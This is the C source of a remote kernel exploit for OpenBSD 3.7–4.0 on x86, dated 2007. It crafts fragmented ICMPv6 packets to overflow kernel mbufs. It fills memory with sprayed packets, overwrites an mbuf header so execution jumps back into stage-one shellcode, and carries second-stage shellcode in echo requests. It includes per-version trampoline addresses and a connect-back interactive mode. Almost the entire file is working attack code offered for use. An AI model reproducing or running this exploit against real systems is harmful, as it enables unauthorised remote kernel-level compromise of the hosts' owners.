/*
 * OpenBSD IPv6 remote kernel exploit.
 *
 *  Copyright (c) 2007 Claes M. Nyberg <cmn@signedness.org>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include "xpl.h"

/* Local routines */
static int xpl_send_pwrpkts(struct pwrpkts *, struct options *);
static struct pwrpkts * xpl_fill_pwrpkts(struct pwrpkts *, 
	const unsigned char *, uint32_t, const unsigned char *, 
	size_t, const unsigned char *, size_t, int); 
static int exploit(struct options *, struct pwrpkts *);
static void usage(const char *);

/* IPv6 Source and destination addresses */
static uint8_t srcip[16];
static uint8_t dstip[16];

/* Targets */
static struct target targets[] =
{
	{"OpenBSD 4.0 GENERIC (x86)", 0xd020238c},
	{"OpenBSD 3.9 GENERIC (x86)", 0xd010233c},
	{"OpenBSD 3.8 GENERIC (x86)", 0xd0101fd2},
	{"OpenBSD 3.7 GENERIC (x86)", 0xd0101fa2},
	{NULL, 0x00000000},
};


/*
 * Send exploit packet.
 */
static int
xpl_send_pwrpkts(struct pwrpkts *pkts, struct options *opt)
{
	size_t i;
	eth_t *e;
	
	if ( (e = eth_open(opt->device)) == NULL)
		err_errnox("Failed to open device %s", opt->device);

	/* Just send a single, valid ICMPv6 packet */
	if (opt->single_icmpv6) {
		
		/* Delete shellcode and recalculate checksum */
		memset(pkts->vic.data, 'A', sizeof(pkts->vic.data));
		ip6_checksum(&pkts->vic.ip6h, sizeof(pkts->vic)-sizeof(eth_hdr_t));

		goto last_packet;
	}

	/* Fill mbuf's */
	printf("[*] Filling mbuf's: ");
	for (i=1; i<=opt->mbuf_fill_count; i++) {

		if (opt->dry_run == 0) {
			eth_send(e, &pkts->frag1, sizeof(pkts->frag1));
			eth_send(e, &pkts->vic, sizeof(pkts->vic)); 
		}
		
		usleep(100);
		if ((i % 10) == 0) {
			printf("%u ", i);
			fflush(stdout);
		}
	}
	printf("\n");

	/* Send overflow packets.
	 * We spice up the memory with valid ICMPv6 packets
	 * containing second stage of shellcode. */
	printf("[*] Sending overflow packet(s): ");
	for (i=0; i<opt->oflow_count; i++) {
		
		if (opt->dry_run == 0) {
			eth_send(e, &pkts->vic, sizeof(pkts->vic)); 
			eth_send(e, &pkts->frag2, sizeof(pkts->frag2));
		}
		
		usleep(1000); 
		if (opt->dry_run == 0) {
			eth_send(e, &pkts->vic, sizeof(pkts->vic)); 
			eth_send(e, &pkts->frag1, sizeof(pkts->frag1)); 
			eth_send(e, &pkts->vic, sizeof(pkts->vic)); 
		}
		if (opt->oflow_count > 1)
			usleep(1000);
		printf(".");
	}
	
	last_packet:
	if (opt->dry_run == 0) 
		eth_send(e, &pkts->vic, sizeof(pkts->vic)); 
	
	printf("\n");

	eth_close(e);
	return(0);
}


/*
 * Create exploit packets.
 */
static struct pwrpkts *
xpl_fill_pwrpkts(struct pwrpkts *pkts, 
		const unsigned char *dstmac, uint32_t trampoline, 
		const unsigned char *stage1, size_t stage1_len,
		const unsigned char *stage2, size_t stage2_len, int force_break) 
{
	uint32_t fragid = 0x0EADBABE;
	uint32_t icid = 0x33f6;

	fragid = (time(NULL) ^ getpid()) >> 8;
	icid = fragid & 0xffff;


	memset(pkts, 0x00, sizeof(struct pwrpkts));
	/* 
	 * First fragment 
	 */
	pkts->frag1.eh.proto = htons(0x86dd); /* IPv6 */
	memcpy(pkts->frag1.eh.dest, dstmac, 6);

		/* IPv6 header */
	pkts->frag1.ip6h.ctl.ver_tc = 0x60; /* IP Version */
	pkts->frag1.ip6h.ctl.ctlx.paylen = 
		htons(sizeof(ip6_hbh_t) + HBHOPTLEN + sizeof(ip6_frag_t));
	pkts->frag1.ip6h.ctl.ctlx.next = 0x00;
	pkts->frag1.ip6h.ctl.ctlx.hops = 0x40;
	memcpy(pkts->frag1.ip6h.src, srcip, 16);
	memcpy(pkts->frag1.ip6h.dst, dstip, 16);

	/* printf("Longitud: %u\n", ntohs(pkts->frag1.ip6h.ctl.ctlx.paylen)); */
		
		/* IPv6 Hop-By-Hop header */
	pkts->frag1.hbh.next = 0x2c;	/* Next header ICMP */
	pkts->frag1.hbh.len = HBHLEN;	/* :D */
	memset(pkts->frag1.hbh_opts, 0x00, sizeof(pkts->frag1.hbh_opts));

		/* IPv6 Fragmentation header */
	pkts->frag1.fh.next = 0x3a;				/* Next header: Hop By Hop */
	pkts->frag1.fh.offlg = htons(0x0001);	/* More fragments: yes */
	pkts->frag1.fh.ident = htonl(fragid);	/* Id */
	
	memset(pkts->frag1.data, 'O', sizeof(pkts->frag1.data));

		/* Checksum */
	ip6_checksum(&pkts->frag1.ip6h, sizeof(pkts->frag1)-sizeof(eth_hdr_t));

	/* 
	 * Second fragment 
     */
	memcpy(&pkts->frag2.eh, &pkts->frag1.eh, sizeof(eth_hdr_t));
   
		/* IPv6 header */ 
	pkts->frag2.ip6h.ctl.ver_tc = 0x60; /* IP Version */
    pkts->frag2.ip6h.ctl.ctlx.paylen = 
        htons(sizeof(icmp6_hdr_t) + 
		sizeof(pkts->frag2.code) + 
		sizeof(pkts->frag2.next_mbuf));
    pkts->frag2.ip6h.ctl.ctlx.next = 0x2c;	/* Next header: fragmentation */
    pkts->frag2.ip6h.ctl.ctlx.hops = 0x40;	/* Hops */
    memcpy(pkts->frag2.ip6h.src, srcip, 16);
    memcpy(pkts->frag2.ip6h.dst, dstip, 16);

		/* IPv6 Fragmentation header */
	pkts->frag2.fh.next = 0x3a;				/* Next header: ICMP6 */
	pkts->frag2.fh.offlg = htons(0x0000);	/* More fragments: no */
	pkts->frag2.fh.ident = htonl(fragid);	/* Id */

		/* ICMPv6 header */
	pkts->frag2.ic.type = 128; /* echo request */
	pkts->frag2.ic.code = 0;
	pkts->frag2.ic.cksum = htons(0xb394); 
	pkts->frag2.ic.data.data16[0] = htons(icid); /* Id */
	pkts->frag2.ic.data.data16[1] = htons(0x0000); /* Sequence */

		/* Fill with NOP's */
	memset(pkts->frag2.code, 0x90, sizeof(pkts->frag2.code));
	if (stage1_len >= sizeof(pkts->frag2.code)) {
		err("Stage one shellcode is too large (%u bytes, maximum %u bytes).\n", 
			stage1_len, sizeof(pkts->frag2.code));
		return(NULL);
	}

		/* Copy shellcode */
	memcpy(&pkts->frag2.code[sizeof(pkts->frag2.code)-(stage1_len)], 
		stage1, stage1_len);

		/* Next mbuf (we land here) */
	memcpy(&pkts->frag2.next_mbuf, 

#if 0
        /* m_hdr */
        "\x00\x00\x00\x00"  /* mh_next */
        "\x00\x00\x00\x00"  /* mh_nextpkt */
		
		"\x00\x00\x00\x00"	/* mh_data */
		"\x01\x01\x01\x01"	/* mh_len */
        "\x00\x00"          /* mh_type */
        "\x02\x00"          /* mh_flags */

        /* pkthdr */
        "BBBB"              /* rcv_interface */
        "\x41\x41\x41\x41"  /* tags */
        "BBBB"              /* len */
        "AAAA"              /* csum_flags */

        /* m_ext */
        "\x00\x00\x00\x00"  /* ext_buf */
        "\x00\x00\x00\x00"  /* ext_free */
        "CCCC"              /* ext_arg */
        "DDDD"              /* ext_size */
        "\x00\x00\x00\x00"  /* ext_type */
        "FFFF"              /* ext_nextref */
        "GGGG",             /* ext_prevref */
        sizeof(pkts->frag2.next_mbuf));

	/* Jump backwards, directly to shellcode */
	pkts->frag2.next_mbuf.mh_nextpkt = - (stage1_len + 3 + 5);
	pkts->frag2.next_mbuf.mh_data = trampoline;
	pkts->frag2.next_mbuf.ext_free = trampoline;
#endif

		/* m_hdr */
		"\x90\x90\x90\xE9"	/* mh_next */
		"\x38\xFF\xFF\xFF"	/* mh_nextpkt */
		"\x00\x00\x00\x00"	/* mh_data */
		"\x01\x01\x01\x01"	/* mh_len */
		"\x00\x00"			/* mh_type */
		"\x81\x00"			/* mh_flags */

		/* pkthdr */
		"BBBB"				/* rcv_interface */
		"\x00\x00\x00\x00"	/* tags */
		"BBBB"				/* len */
		"AAAA"				/* csum_flags */
	
		/* m_ext */
		"ABCD"				/* ext_buf */
		"\xff\xff\xff\xff"	/* ext_free */
		"CCCC"				/* ext_arg */
		"DDDD"              /* ext_size */
		"EEEE"				/* ext_type */
		"FFFF"				/* ext_nextref */
		"GGGG",				/* ext_prevref */
		sizeof(pkts->frag2.next_mbuf));

	/* Jump backwards, directly to shellcode */
	pkts->frag2.next_mbuf.mh_nextpkt = - (stage1_len + 3 + 5);
	pkts->frag2.next_mbuf.mh_data = trampoline;
	pkts->frag2.next_mbuf.ext_free = trampoline;

	if (force_break)
		((uint8_t *)&pkts->frag2.next_mbuf)[2] = 0xcc;

		/* Checksum 
		 * libdnet does not support checksum of fragmented ICMP frames*/
	{
		int sum;
		size_t len;

		len = 276;
		pkts->frag2.ic.cksum = 0;
		sum = ip_cksum_add(&pkts->frag2.ic, len, 0) + htons(0x3a + len);
		sum = ip_cksum_add(&pkts->frag2.ip6h.src, 32, sum);
		pkts->frag2.ic.cksum = ip_cksum_carry(sum);
	}


	/*
	 * Build valid ICMPv6 packet
	 */
	memcpy(&pkts->vic.eh, &pkts->frag1.eh, sizeof(eth_hdr_t));
	
        /* IPv6 header */
    pkts->vic.ip6h.ctl.ver_tc = 0x60; /* IP Version */
    pkts->vic.ip6h.ctl.ctlx.paylen = 
		htons(sizeof(icmp6_hdr_t)+sizeof(pkts->vic.data));
    pkts->vic.ip6h.ctl.ctlx.next = 0x3a;  /* Next header: ICMPv6 */
    pkts->vic.ip6h.ctl.ctlx.hops = 0x40;  /* Hops */
    memcpy(pkts->vic.ip6h.src, srcip, 16);
    memcpy(pkts->vic.ip6h.dst, dstip, 16);

        /* ICMPv6 header */
    pkts->vic.ic.type = 128; /* echo request */
    pkts->vic.ic.code = 0;
    pkts->vic.ic.cksum = 0xc4cb;
    pkts->vic.ic.data.data16[0] = htons(icid); /* Id */
    pkts->vic.ic.data.data16[1] = 0x0000; /* Sequence */

	/* Copy stage 2 */
	if (stage2_len > 750) {
		err("Stage 2 shellcode to large (%u bytes), tweak the sploit\n", stage2_len);
		return(NULL);
	}
	memset(pkts->vic.data, 'T', sizeof(pkts->vic.data));
	*((uint32_t *)&pkts->vic.data[0]) = MAGIC_START;

	memcpy(&pkts->vic.data[4], stage2, stage2_len);

	*((uint32_t *)&pkts->vic.data[4+stage2_len]) = MAGIC_END;

		/* Checksum */
	ip6_checksum(&pkts->vic.ip6h, sizeof(pkts->vic)-sizeof(eth_hdr_t));
	return(pkts);
}


/*
 * Fill and send exploit packets
 */
static int
exploit(struct options *opt, struct pwrpkts *pkts)
{
	unsigned char *s1;
	unsigned char *s2;
	extern uint8_t stage1_start;
	extern uint8_t stage1_end;
	extern uint8_t hash_resolve_offset;
	unsigned int stage1_len;
	extern uint8_t stage2_start;
	extern uint8_t stage2_end;
	extern uint8_t hash_resolve;
	uint32_t hash_resolve_offval;
	unsigned int stage2_len;
	unsigned int off;

    printf("[*] Using jmp esi trampoline at 0x%08x\n", 
		opt->trampoline);

	stage1_len = (unsigned int)&stage1_end; 
	stage1_len -= (unsigned int)&stage1_start;
	printf("[*] Stage one shellcode: %u bytes\n", stage1_len);
	
	stage2_len = (unsigned int)&stage2_end;
	stage2_len -= (unsigned int)&stage2_start;
	printf("[*] Stage two shellcode: %u bytes\n", stage2_len);
	
	hash_resolve_offval = (unsigned int)&hash_resolve;
	hash_resolve_offval -= (unsigned int)&stage2_start;
	verbose(0, "[*] hash_resolve at offset %u in stage two shellcode\n", 
		hash_resolve_offval);

	HEAPBUF(s1, stage1_len+10);
	memcpy(s1, &stage1_start, stage1_len);

	HEAPBUF(s2, stage2_len+10);
	memcpy(s2, &stage2_start, stage2_len);

	/* Set offset to hash_resolve */
	off = (unsigned int)&hash_resolve_offset - (unsigned int)&stage1_start+1;
	*((uint32_t *)&s1[off]) = hash_resolve_offval;

	if (xpl_fill_pwrpkts(pkts, opt->target_mac, 
			opt->trampoline, s1, stage1_len, 
			s2, stage2_len, opt->force_break) == NULL) {
		errx("Failed to build power packets, aborting\n");
	}


	if (opt->iact)
		return(0);

	xpl_send_pwrpkts(pkts, opt);
	return(0);
}



static void
usage(const char *pname)
{
	int i;
	printf("Usage: %s <interface> <target-mac> -t <target> [Option(s)]\n", pname);
	printf("Options:\n");
	printf(" -b              - Force a breakpoint at beginning of mbuf\n");
	printf(" -d              - Dry run, do not really attack\n");
	printf(" -i              - Enter interactive mode without exploiting\n");
	printf(" -l              - Do not listen for connect back\n");
	printf(" -P              - Just send a single valid ICMPv6 (echo request) packet to target\n");
	printf(" -f <num>        - Number of mbuf-fill packets to send.\n");
	printf(" -o <num>        - Number of overflow packets to send.\n");
	printf(" -t <target>     - Target ID or address to jmp esi instruction\n");
	printf("\n Targets:\n");
	for (i=0; targets[i].desc != NULL; i++)
		printf("   [%d] %s - 0x%08x\n", i, targets[i].desc, targets[i].trampoline);
	printf("\n");
	exit(EXIT_FAILURE);
}

int
main(int argc, char *argv[])
{
	struct pwrpkts pkts;
	struct options opt;
	int i;

	memset(&opt, 0x00, sizeof(opt));
	memset(&pkts, 0x00, sizeof(pkts));
	opt.mbuf_fill_count = 100;
	opt.oflow_count = 1;

	printf("\n-=[ OpenBSD IPv6 remote kernel exploit ]=-\n");
	printf("-=[ By CMN <claes.nyberg at bitsec.se> ]=-\n\n");

	if (argc < 3)
		usage(argv[0]);

	opt.device = argv[1];
	if (macstr((unsigned char *)argv[2], opt.target_mac) != 0)
		errx("Failed to resolve hardware address\n");

	while ( (i = getopt(argc-2, &argv[2], "f:o:t:ildPb")) != -1) {
		switch (i) {
			case 'b':
				opt.force_break = 1;
				break;
				
			case 'd':
				opt.dry_run = 1;
				break;
			
			case 'i':
				opt.iact = 1;
				break;
			
			case 'l':
				opt.no_listen = 1;
				break;
				
			case 'f':
				opt.mbuf_fill_count = strtoul(optarg, NULL, 0);
				break;
				
			case 'o':
				opt.oflow_count = strtoul(optarg, NULL, 0);
				break;
			
			case 'P':
				opt.single_icmpv6 = 1;
				opt.no_listen = 1;
				break;
				
			case 't':
				opt.trampoline = strtoul(optarg, NULL, 0);
				i = (sizeof(targets) / sizeof(struct target)) - 1;
				
				if ((opt.trampoline >= 0) && (opt.trampoline < i)) {
					printf("[*] Attacking %s\n", targets[opt.trampoline].desc);
					opt.trampoline = targets[opt.trampoline].trampoline;
				}
				break;
				
			default:
				usage(argv[0]);
		}
	}

	if (opt.trampoline == 0)
		usage(argv[0]);

	/* IPv6 addresses */
	memcpy(srcip, "\xfe\x80\x00\x00\x00\x00\x00\x00\x02\x0f\x29\xff\xfe\x44\x68\x6f", 16);
	memcpy(dstip, "\xff\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01", 16);

	/* We modify the source address a little for each run */
	srcip[13] ^= (time(NULL) ^ getpid());
	srcip[14] ^= (time(NULL) ^ getpid() >> 8);
	srcip[15] ^= (time(NULL) ^ getpid() >> 16);

	/* Configure shellcode and send power packets */
	if (exploit(&opt, &pkts) < 0)
		errx("Failed to send exploit packets");

	if (opt.dry_run || opt.single_icmpv6)
		exit(EXIT_SUCCESS);

	opt.magic = 0x41424344;
	iact(&pkts.vic, &opt);
	exit(EXIT_SUCCESS);
}

